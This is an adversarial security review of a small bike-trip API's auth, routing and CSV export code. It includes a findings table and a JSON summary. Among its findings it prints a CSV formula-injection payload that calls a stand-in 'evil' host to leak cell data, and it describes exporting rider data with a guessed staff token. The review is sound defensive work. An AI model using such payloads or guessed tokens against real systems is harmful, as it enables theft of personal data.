# Adversarial Diagnostic Review: Pedalo ops API handlers

## Pass 1: Reconstruct

The work implements `app.handle`, which authenticates every request first. A missing or unknown token returns 401. `/trips` returns the caller's own trips. Anything under `/staff/` returns 403 unless the caller's role is `staff`. The two export routes return every rider's rows, including names and emails, as a list or as CSV.

For this to be correct, several things must hold:
- Tokens must be secret and bound to the right identity.
- The `rider` field must uniquely identify a rider.
- Every staff route must sit behind the `startswith("/staff/")` gate.
- The CSV must faithfully represent the rows when staff open it.

Unstated assumptions:
- The hardcoded `_TOKENS` table is a placeholder.
- Rider names are unique and never contain CSV-special characters.

## Pass 2: Attack (Track B, with Track R for the personal data)

**Routing and authorization trace**
- Both export routes are exact-matched inside the `/staff/` branch, after `require_staff`. Every path that returns export data therefore passes the staff gate.
- `/staff`, `/staff/x`, `/Staff/trips.json` and `/staff/trips.csv?x=1` all fall through to 403 or 404. None of them leaks data.
- A missing token on a `/staff` route returns 401, because authentication runs before routing. This matches the spec.
- A staff token on `/trips` returns `for_rider("sam")`, which is empty. That is harmless.

**Hostile inputs**
- Token `None`, `12345` or `b"..."` becomes `b""`, matches nothing, and returns 401.
- A non-ASCII token is encoded first, so `compare_digest` does not raise.
- A request without a `"path"` key causes `request["path"]` to raise `KeyError`, which is an unhandled crash.

**CSV**
- `as_csv` builds rows with an f-string and does no quoting or escaping.

**Tests**
- No test sends a missing token to a `/staff` route, which is the spec's explicit 401 case.
- The JSON export test checks only the status code.
- The rider test would still pass if one of Rita's two trips were dropped.

## Pass 3: Self-check

I kept only findings that point to a specific line. I downgraded the name-keyed scoping finding to PROBABLE, because the data model may treat `rider` as a unique username.

The most serious thing I might be missing would sit in the real auth and data backends, which this code stubs. Neither was in scope to review.

---

**VERDICT: SHIP WITH FIXES.** The routing and 401/403 logic is correct against the request, but the token store and CSV export cannot go to production as written.

**CONFIDENCE IN VERDICT: medium.** Two things limit it:
- I could not run the tests.
- I don't know whether `_TOKENS` is intended as the production store. If it is, and no real auth exists, the verdict becomes REWORK.

## FINDINGS

| # | Severity | Evidence | Location | What is wrong | Failure scenario | Fix or test |
|---|---|---|---|---|---|---|
| 1 | Critical | CONFIRMED (code); PROBABLE (that it would ship) | `auth.py` `_TOKENS = {"tok-rita": ..., "tok-sam": ..., "tok-ola": ...}` | Bearer tokens are hardcoded in source, follow a guessable `tok-<name>` pattern, and never expire or rotate. | Anyone with repo access, or anyone who knows a staff member's first name, sends `token="tok-sam"` to `/staff/trips.csv` and receives every rider's name and email. | Load tokens from the real identity provider or a secret store, with expiry and revocation. Remove literal tokens from source and keep test tokens in test fixtures only. |
| 2 | High | CONFIRMED | `trips.py` `as_csv`: `f"{t['rider']},{t['email']},{t['bike']},{t['km']}"` | There is no CSV quoting and no formula neutralization. | A rider who registers the name `=HYPERLINK("http://evil/?"&B2,"x")`, `Smith, Jr.`, or a name containing a newline causes the export to shift columns, forge extra rows, or run a formula when staff open it in Excel (CSV/formula injection). | Use `csv.writer` (`QUOTE_MINIMAL` or `QUOTE_ALL`). Prefix cells starting with `= + - @ \t \r` with `'`. Add a test with a comma, a quote, a newline and a leading `=` in `rider`. |
| 3 | Medium | PROBABLE | `app.py` `trips.for_rider(ident[0])` and `trips.py` `t["rider"] == name` | A rider's own trips are selected by matching on a name string, not on a unique rider ID. The CSV header and the spec treat `rider` as a name. | Two riders named "rita" each see the other's trips and email address through `/trips`. | Key trips and identities on an immutable unique rider ID. Add a test with two riders who share a display name. |
| 4 | Medium | CONFIRMED | `test_app.py` | The spec's explicit "no token on /staff gives 401" case is untested. The tests cover only `/trips` with `None`. | Someone later moves the staff branch above `auth.current`, or adds an unauthenticated fast path. The suite stays green while anonymous callers hit the export. | Add `get("/staff/trips.csv", None)` and `get("/staff/trips.json", "bogus")` and assert 401. Assert that both rider 403 responses carry no row data. |
| 5 | Low | CONFIRMED | `test_app.py` `test_staff_can_export_json`, `test_rider_sees_only_their_own_trips` | The tests are weak. The JSON test asserts status only. The rider test passes if any non-empty subset of Rita's trips is returned. | A regression that returns `[]` with 200 from the JSON export, or drops one of Rita's trips, stays green. | Assert the full JSON body, including Tomás's row. Assert that Rita's trip count is 2. |
| 6 | Low | CONFIRMED | `app.py` `path = request["path"]` | An unguarded key access means a malformed request produces an unhandled `KeyError`. | A request without `path` crashes the handler, giving a 500 or a stack trace depending on the host. | Use `request.get("path")` and return 400 or 404 when it is missing. |
| 7 | Low | PROBABLE (beyond the request's scope) | `app.py` staff export branches | Bulk exports of personal data leave no audit record. | A staff token is misused (see finding 1) and there is no record of who exported what, or when. | Log actor, route and timestamp for every `/staff` export, with no row contents. Flag this to the owner as a requirement decision. |

## WHAT HOLDS UP

- The authentication-before-routing order is correct.
- The `startswith("/staff/")` gate covers both export routes. There is no path variant that reaches the data without the role check.
- The status codes match the spec: 401 for a missing or unknown token, 403 for a rider on `/staff`.
- Non-string tokens are handled without raising.
- `compare_digest` is used on bytes. Iteration order leaks only which slot matched, not the token contents.
- Rows are copied with `dict(t)`, so callers cannot mutate the store.

## UNVERIFIED CLAIMS

- **"7 tests in test_app.py pass."** There are 7 tests, and tracing them by hand they should pass. Confirm by running `python -m unittest test_app -v`.
- **The tests guard the authorization logic.** Confirm in a scratch copy by deleting the `auth.require_staff(ident)` call and checking that `test_rider_cannot_export_json` and `test_rider_cannot_export_csv` fail. Then move the `/staff` branch above `auth.current` and check whether any test fails. I predict none will, which is finding 4.

## QUESTIONS FOR THE AUTHOR

1. Is `_TOKENS` the production token source, or a placeholder for a real identity service? If it is production, the verdict becomes REWORK.
2. Is `rider` a unique, immutable username, or a display name that riders can choose or share?
3. Can riders set their own names? That determines whether CSV injection is reachable.

## DECISION-MAKER SUMMARY

The access rules match the request, but do not deploy until hardcoded, guessable tokens are replaced with real authentication (finding 1) and the CSV export is properly escaped (finding 2). Also confirm that rider scoping uses a unique ID (finding 3) and add the missing 401 test (finding 4). If it ships as is, anyone who guesses a staff token can download every rider's name and email.

## OWNER SUMMARY

The rules for who may see what are built correctly. However, the login keys are written directly into the code and are easy to guess, which would let an outsider download every rider's name and email. The spreadsheet export also needs fixing so that a rider cannot plant harmful content in it, and both problems should be fixed before launch.

```json
{
  "verdict": "SHIP WITH FIXES",
  "findings": [
    {"severity": "Critical", "evidence_level": "CONFIRMED", "location": "auth.py _TOKENS", "scenario": "Hardcoded, guessable bearer tokens (tok-<name>); anyone with repo access or a staff first name calls /staff/trips.csv with tok-sam and gets all rider names and emails.", "fix": "Load tokens from the identity provider or a secret store with expiry and revocation; keep literal tokens only in test fixtures."},
    {"severity": "High", "evidence_level": "CONFIRMED", "location": "trips.py as_csv f-string row", "scenario": "A rider name containing a comma, quote or newline, or starting with '=', corrupts columns, forges rows, or runs a formula when staff open the export in a spreadsheet.", "fix": "Use csv.writer with quoting and neutralize leading = + - @ tab CR; add a test with hostile rider names."},
    {"severity": "Medium", "evidence_level": "PROBABLE", "location": "app.py trips.for_rider(ident[0]); trips.py t['rider'] == name", "scenario": "Two riders sharing a name see each other's trips and emails via /trips.", "fix": "Key trips and identities on a unique immutable rider ID; add a shared-name test."},
    {"severity": "Medium", "evidence_level": "CONFIRMED", "location": "test_app.py (missing test)", "scenario": "No test covers no-token or bad-token on /staff routes; a refactor that lets anonymous callers reach exports stays green.", "fix": "Add tests asserting 401 for None and an unknown token on /staff/trips.json and /staff/trips.csv."},
    {"severity": "Low", "evidence_level": "CONFIRMED", "location": "test_app.py test_staff_can_export_json, test_rider_sees_only_their_own_trips", "scenario": "The JSON export returning [] with 200, or a dropped rider trip, still passes.", "fix": "Assert full JSON body contents and exact rider trip count."},
    {"severity": "Low", "evidence_level": "CONFIRMED", "location": "app.py path = request['path']", "scenario": "A request without a path raises KeyError, an unhandled crash.", "fix": "Use request.get('path') and return 400 or 404 when missing."},
    {"severity": "Low", "evidence_level": "PROBABLE", "location": "app.py /staff export branches", "scenario": "Bulk personal-data exports leave no audit trail, so misuse of a staff token cannot be traced.", "fix": "Log actor, route and timestamp (no row contents) for each staff export; confirm the requirement with the owner."}
  ]
}
```